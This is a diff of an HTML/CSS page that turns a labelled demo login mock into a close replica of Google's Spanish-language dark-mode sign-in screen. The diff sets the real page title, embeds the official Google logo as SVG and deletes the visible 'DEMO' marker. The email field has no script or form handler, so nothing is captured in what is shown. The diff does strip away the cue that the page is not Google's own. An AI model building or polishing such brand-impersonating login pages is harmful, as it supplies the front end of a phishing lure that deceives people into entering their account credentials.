@@ -3,439 +3,318 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Cuenta Demo</title>
-
+<title>Iniciar sesión: Cuentas de Google</title>
 <style>
+    /* =====================================================
+       GENERAL & RESET
+    ===================================================== */
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+    }
 
-/* =====================================================
-   GENERAL
-===================================================== */
-
-* {
-    box-sizing: border-box;
-}
-
-html,
-body {
-    margin: 0;
-    padding: 0;
-    width: 100%;
-    min-height: 100%;
-}
-
-body {
-    min-height: 100vh;
-    background: #202124; /* Color de fondo exacto del modo oscuro de Google */
-    font-family: Arial, Helvetica, sans-serif;
-    color: #e3e3e3;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    padding: 20px;
-}
-
-
-/* =====================================================
-   CONTENEDOR PRINCIPAL
-===================================================== */
-
-.pagina {
-    width: 100%;
-    max-width: 920px;
-}
-
-
-/* =====================================================
-   TARJETA
-===================================================== */
-
-.tarjeta {
-    width: 100%;
-    height: 422px;
-    background: #0f0f0f;
-    border-radius: 27px;
-    padding: 40px 36px;
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    column-gap: 66px;
-}
-
-
-/* =====================================================
-   IZQUIERDA
-===================================================== */
-
-.izquierda {
-    display: flex;
-    flex-direction: column;
-    align-items: flex-start;
-}
-
-
-/* =====================================================
-   LOGO
-===================================================== */
-
-.logo {
-    width: 46px;
-    height: 46px;
-    object-fit: contain;
-    margin-bottom: 26px;
-}
-
-
-/* =====================================================
-   TITULO
-===================================================== */
-
-h1 {
-    margin: 0;
-    font-size: 36px;
-    line-height: 1.2;
-    font-weight: 400;
-    letter-spacing: -0.6px;
-    color: #e3e3e3;
-}
-
-
-/* =====================================================
-   DESCRIPCION
-===================================================== */
-
-.descripcion {
-    margin-top: 14px;
-    font-size: 16px;
-    line-height: 1.5;
-    color: #e3e3e3;
-}
-
-
-/* =====================================================
-   DERECHA
-===================================================== */
-
-.derecha {
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    padding-top: 8px;
-}
-
-
-/* =====================================================
-   CAMPO
-===================================================== */
-
-.campo {
-    position: relative;
-    width: 100%;
-    margin-top: -1px;
-}
-
-.campo input {
-    width: 100%;
-    height: 56px;
-    padding: 15px;
-    border: 1px solid #8e918f;
-    border-radius: 4px;
-    background: transparent;
-    color: #e3e3e3;
-    font-size: 16px;
-    outline: none;
-}
-
-.campo input:hover {
-    border-color: #c4c7c5;
-}
-
-.campo input:focus {
-    border: 2px solid #a8c7fa;
-    padding: 14px;
-}
-
-
-/* =====================================================
-   LABEL
-===================================================== */
-
-.campo label {
-    position: absolute;
-    left: 13px;
-    top: 18px;
-    padding: 0 5px;
-    color: #c4c7c5;
-    background: #0f0f0f;
-    font-size: 16px;
-    pointer-events: none;
-    transition: 0.15s;
-}
-
-.campo input:focus + label,
-.campo input:not(:placeholder-shown) + label {
-    top: -8px;
-    font-size: 12px;
-    color: #a8c7fa;
-}
-
-
-/* =====================================================
-   ENLACE
-===================================================== */
-
-.enlace {
-    display: inline-block;
-    margin-top: 11px;
-    color: #a8c7fa;
-    font-size: 14px;
-    font-weight: 500;
-    text-decoration: none;
-}
-
-.enlace:hover {
-    text-decoration: underline;
-}
-
-
-/* =====================================================
-   TEXTO INFORMATIVO
-===================================================== */
-
-.informacion {
-    margin-top: 32px;
-    max-width: 395px;
-    color: #c4c7c5;
-    font-size: 14px;
-    line-height: 1.5;
-}
-
-.informacion a {
-    color: #a8c7fa;
-    text-decoration: none;
-    font-weight: 500;
-}
-
-.informacion a:hover {
-    text-decoration: underline;
-}
-
-
-/* =====================================================
-   ACCIONES
-===================================================== */
-
-.acciones {
-    width: 100%;
-    margin-top: 42px;
-    display: flex;
-    justify-content: flex-end;
-    align-items: center;
-    gap: 28px;
-}
-
-
-/* =====================================================
-   CREAR
-===================================================== */
-
-.crear {
-    color: #a8c7fa;
-    text-decoration: none;
-    font-size: 14px;
-    font-weight: 600;
-}
-
-.crear:hover {
-    text-decoration: underline;
-}
-
-
-/* =====================================================
-   BOTON (RÉPLICA EXACTA GOOGLE)
-===================================================== */
-
-button {
-    min-width: 108px;
-    height: 40px;
-    padding: 0 24px;
-    border: none;
-    border-radius: 100px; /* Completamente redondo como la original */
-    background: #a8c7fa;  /* Azul pastel original */
-    color: #041e49;       /* Letras azul marino oscuro como la original */
-    font-size: 14px;
-    font-weight: 600;
-    cursor: pointer;
-}
-
-button:hover {
-    background: #b8d4ff;
-}
-
-button:active {
-    transform: scale(.98);
-}
-
-
-/* =====================================================
-   DEMO
-===================================================== */
-
-.demo {
-    text-align: center;
-    margin-top: 6px;
-    color: #777b80;
-    font-size: 9px;
-    letter-spacing: 1px;
-    user-select: none;
-}
-
-
-/* =====================================================
-   PIE DE PÁGINA
-===================================================== */
-
-.pie {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 20px 16px 0;
-    color: #c4c7c5;
-    font-size: 12px;
-}
-
-.pie-derecha {
-    display: flex;
-    gap: 28px;
-}
-
-.pie a {
-    color: #c4c7c5;
-    text-decoration: none;
-}
-
-.pie a:hover {
-    text-decoration: underline;
-}
-
-.desplegable-idioma {
-    font-size: 8px;
-    margin-left: 5px;
-    vertical-align: middle;
-}
-
-
-/* =====================================================
-   CELULAR
-===================================================== */
-
-@media (max-width: 700px) {
     body {
-        padding: 15px;
+        background-color: #202124; /* Gris Google original */
+        font-family: Roboto, Arial, sans-serif;
+        color: #e3e3e3;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
     }
 
-    .tarjeta {
-        height: auto;
-        min-height: 500px;
-        display: block;
-        padding: 32px 25px;
-        border-radius: 22px;
+    /* =====================================================
+       ESTRUCTURA DE LA TARJETA PRINCIPAL
+    ===================================================== */
+    .contenedor {
+        width: 100%;
+        max-width: 920px;
     }
 
-    .izquierda {
-        margin-bottom: 45px;
+    .tarjeta-login {
+        background-color: #0f0f0f; /* Fondo interno negro/gris muy oscuro */
+        border-radius: 28px;
+        padding: 40px;
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        column-gap: 48px;
+        min-height: 420px;
     }
 
-    .logo {
-        margin-bottom: 25px;
+    /* Sección Izquierda (Textos estáticos) */
+    .seccion-izquierda {
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+        justify-content: flex-start;
+    }
+
+    .logo-google {
+        width: 48px;
+        height: 48px;
+        margin-bottom: 20px;
+        object-fit: contain;
     }
 
     h1 {
-        font-size: 30px;
+        font-size: 36px;
+        font-weight: 400;
+        line-height: 1.25;
+        color: #e3e3e3;
+        letter-spacing: -0.5px;
     }
 
-    .descripcion {
-        margin-top: 14px;
+    .subtitulo {
+        font-size: 16px;
+        color: #e3e3e3;
+        margin-top: 16px;
+        font-weight: 400;
     }
 
-    .derecha {
-        padding-top: 0;
-    }
-
-    .informacion {
-        margin-top: 35px;
-    }
-
-    .acciones {
-        margin-top: 35px;
-        justify-content: space-between;
-    }
-
-    .pie {
-        padding-left: 8px;
-        padding-right: 8px;
+    /* Sección Derecha (Formulario e Inputs) */
+    .seccion-derecha {
+        display: flex;
         flex-direction: column;
-        align-items: flex-start;
-        gap: 18px;
+        justify-content: flex-start;
+        padding-top: 10px;
     }
 
-    .pie-derecha {
-        gap: 20px;
+    /* =====================================================
+       INPUT FLOTANTE (ESTILO ORIGINAL DE GOOGLE)
+    ===================================================== */
+    .campo-contenedor {
+        position: relative;
+        width: 100%;
+        margin-bottom: 12px;
     }
-}
 
+    .campo-contenedor input {
+        width: 100%;
+        height: 56px;
+        padding: 16px;
+        border: 1px solid #8e918f;
+        border-radius: 4px;
+        background: transparent;
+        color: #e3e3e3;
+        font-size: 16px;
+        outline: none;
+        transition: border-color 0.15s ease;
+    }
+
+    .campo-contenedor input:hover {
+        border-color: #c4c7c5;
+    }
+
+    .campo-contenedor input:focus {
+        border: 2px solid #a8c7fa;
+        padding: 15px; /* Compensa el ancho del borde */
+    }
+
+    .campo-contenedor label {
+        position: absolute;
+        left: 12px;
+        top: 16px;
+        background-color: #0f0f0f;
+        padding: 0 6px;
+        color: #c4c7c5;
+        font-size: 16px;
+        pointer-events: none;
+        transition: 0.15s ease-out;
+    }
+
+    /* Efecto cuando el input se enfoca o tiene texto */
+    .campo-contenedor input:focus + label,
+    .campo-contenedor input:not(:placeholder-shown) + label {
+        top: -10px;
+        left: 10px;
+        font-size: 12px;
+        color: #a8c7fa;
+    }
+
+    /* =====================================================
+       ENLACES Y TEXTOS INFORMATIVOS
+    ===================================================== */
+    .enlace-azul {
+        color: #a8c7fa;
+        font-size: 14px;
+        font-weight: 500;
+        text-decoration: none;
+        display: inline-block;
+    }
+
+    .enlace-azul:hover {
+        text-decoration: underline;
+    }
+
+    .texto-invitado {
+        font-size: 14px;
+        color: #c4c7c5;
+        line-height: 1.43;
+        margin-top: 36px;
+        margin-bottom: 12px;
+    }
+
+    /* =====================================================
+       BOTONES Y ACCIONES
+    ===================================================== */
+    .bloque-acciones {
+        margin-top: auto; /* Empuja las acciones al fondo del bloque */
+        display: flex;
+        justify-content: flex-end;
+        align-items: center;
+        gap: 24px;
+        padding-top: 20px;
+    }
+
+    .btn-crear {
+        color: #a8c7fa;
+        text-decoration: none;
+        font-size: 14px;
+        font-weight: 500;
+    }
+
+    .btn-crear:hover {
+        text-decoration: underline;
+    }
+
+    .btn-siguiente {
+        background-color: #a8c7fa; /* Celeste pastel exacto */
+        color: #041e49;            /* Texto oscuro marino */
+        border: none;
+        border-radius: 100px;      /* Redondeado estilo píldora */
+        height: 40px;
+        padding: 0 24px;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: background-color 0.1s ease;
+    }
+
+    .btn-siguiente:hover {
+        background-color: #b8d4ff;
+    }
+
+    /* =====================================================
+       FOOTER / PIE DE PÁGINA
+    ===================================================== */
+    .pie-pagina {
+        width: 100%;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 24px;
+        padding: 0 16px;
+        font-size: 12px;
+    }
+
+    .pie-pagina a {
+        color: #c4c7c5;
+        text-decoration: none;
+    }
+
+    .pie-pagina a:hover {
+        text-decoration: underline;
+    }
+
+    .menu-idioma {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+    }
+
+    .flecha-desplegable {
+        font-size: 9px;
+    }
+
+    .enlaces-legales {
+        display: flex;
+        gap: 24px;
+    }
+
+    /* =====================================================
+       DISEÑO RESPONSIVO (MÓVILES)
+    ===================================================== */
+    @media (max-width: 768px) {
+        .tarjeta-login {
+            grid-template-columns: 1fr;
+            row-gap: 32px;
+            padding: 32px 24px;
+            min-height: auto;
+        }
+
+        h1 {
+            font-size: 28px;
+        }
+
+        .texto-invitado {
+            margin-top: 24px;
+        }
+
+        .pie-pagina {
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 16px;
+            padding: 0 8px;
+        }
+    }
 </style>
 </head>
-
 <body>
 
-<div class="pagina">
-
-    <!-- TARJETA -->
-    <div class="tarjeta">
-
-        <!-- IZQUIERDA -->
-        <div class="izquierda">
-            <img src="google.png" class="logo" alt="Google">
+<div class="contenedor">
+    <!-- TARJETA PRINCIPAL -->
+    <div class="tarjeta-login">
+        
+        <!-- SECCIÓN IZQUIERDA -->
+        <div class="seccion-izquierda">
+            <!-- Icono SVG oficial de la 'G' de Google -->
+            <svg class="logo-google" viewBox="0 0 24 24" width="48" height="48">
+                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
+                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
+            </svg>
             <h1>Accede a tu cuenta</h1>
-            <div class="descripcion">Usa tu Cuenta de Google</div>
+            <div class="subtitulo">Usa tu Cuenta de Google</div>
         </div>
 
-        <!-- DERECHA -->
-        <div class="derecha">
-            <div class="campo">
-                <input type="text" id="correo" placeholder=" " autocomplete="off">
-                <label for="correo">Correo electrónico o teléfono</label>
+        <!-- SECCIÓN DERECHA -->
+        <div class="seccion-derecha">
+            <div class="campo-contenedor">
+                <input type="text" id="identificador" placeholder=" " autocomplete="off">
+                <label for="identificador">Correo electrónico o teléfono</label>
             </div>
-            
-            <a href="#" class="enlace">¿Olvidaste el correo electrónico?</a>
 
-            <div class="informacion">
+            <a href="#" class="enlace-azul">¿Olvidaste el correo electrónico?</a>
+
+            <div class="texto-invitado">
                 ¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada. 
-                <a href="#">Más información para usar el modo de invitado</a>
+                <a href="#" class="enlace-azul">Más información para usar el modo de invitado</a>
             </div>
 
-            <div class="acciones">
-                <a href="#" class="crear">Crear cuenta</a>
-                <button type="button">Siguiente</button>
+            <div class="bloque-acciones">
+                <a href="#" class="btn-crear">Crear cuenta</a>
+                <button class="btn-siguiente" type="button">Siguiente</button>
             </div>
         </div>
 
     </div>
 
-    <div class="demo">DEMO</div>
-
     <!-- PIE DE PÁGINA -->
-    <div class="pie">
-        <div class="pie-izquierda">
-            <a href="#">Español (Latinoamérica) <span class="desplegable-idioma">▼</span></a>
+    <div class="pie-pagina">
+        <div class="menu-idioma">
+            <a href="#">Español (Latinoamérica)</a>
+            <span class="flecha-desplegable" color="#c4c7c5">▼</span>
         </div>
-        <div class="pie-derecha">
+        <div class="enlaces-legales">
             <a href="#">Ayuda</a>
             <a href="#">Privacidad</a>
             <a href="#">Condiciones</a>
         </div>
     </div>
-
 </div>
 
 </body>
